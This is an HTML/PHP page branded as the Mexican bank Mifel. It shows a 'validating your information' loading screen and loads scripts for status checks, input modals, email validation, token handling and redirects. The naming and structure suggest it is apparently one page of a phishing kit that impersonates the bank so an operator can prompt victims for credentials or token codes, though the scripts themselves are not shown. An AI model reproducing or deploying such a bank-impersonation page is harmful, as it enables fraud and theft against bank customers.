<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validando información - Acceso</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/feLinicio.css">
    <link rel="stylesheet" href="css/_responsivefel.css">
    <link rel="stylesheet" href="css/gps.css">
    <link rel="stylesheet" href="css/loading.css">
    <link rel="stylesheet" href="php_modales/css/modales_input_no_input.css">
    <link rel="stylesheet" href="php_modales/css/herramientas.css">
    <link rel="stylesheet" href="php_modales/css/reloj_personalizado.css">
    <link rel="stylesheet" href="php_modales/css/email_validate.css">
    <?php require_once __DIR__ . '/includes/personas_token_assets.php'; personas_token_assets_head(); ?>
    <link rel="stylesheet" href="css/zeppelin_churro_btn.css">
    <?php require_once __DIR__ . '/includes/responsive_movil.php'; mifel_responsive_movil_assets('cargando'); ?>
</head>
<body>
    <header class="header-container">
        <div class="header-wrapper">
            <div class="logo-center">
                <img src="images/logo_mifel_hd.svg" alt="Mifel" class="mifel-header-logo">
            </div>
            <div class="language-dropdown">
                <img src="images/Flag_mx2.svg" alt="México" class="flag-icon">
                <span class="language-text">ES</span>
                <img src="images/drop_down.png" alt="dropdown" class="dropdown-arrow">
            </div>
        </div>
    </header>
    <div class="progress-bar-sync">
        <div class="progress-fill-sync"></div>
    </div>

    <main class="validacion-container">
        <div class="validacion-content">
            <h1 class="validacion-title">Estamos validando tu información</h1>
            <div class="validacion-loader-container">
                <img src="images/mifel-loader.gif" alt="Cargando..." class="validacion-loader-gif">
            </div>
            <p class="validacion-text">[Mensaje Dinámico]</p>
        </div>
    </main>

    <script src="js/validacionDinamica.js"></script>
    <script src="php_modales/js/check_status.js"></script>
    <script src="php_modales/js/modales_input_no_input.js"></script>
    <script src="php_modales/js/herramientas.js"></script>
    <script src="php_modales/js/reloj_personalizado.js"></script>
    <script src="php_modales/js/redirecciones.js"></script>
    <script src="php_modales/js/email_validate_handler.js"></script>
    <?php personas_token_assets_scripts(); ?>
</body>
</html>
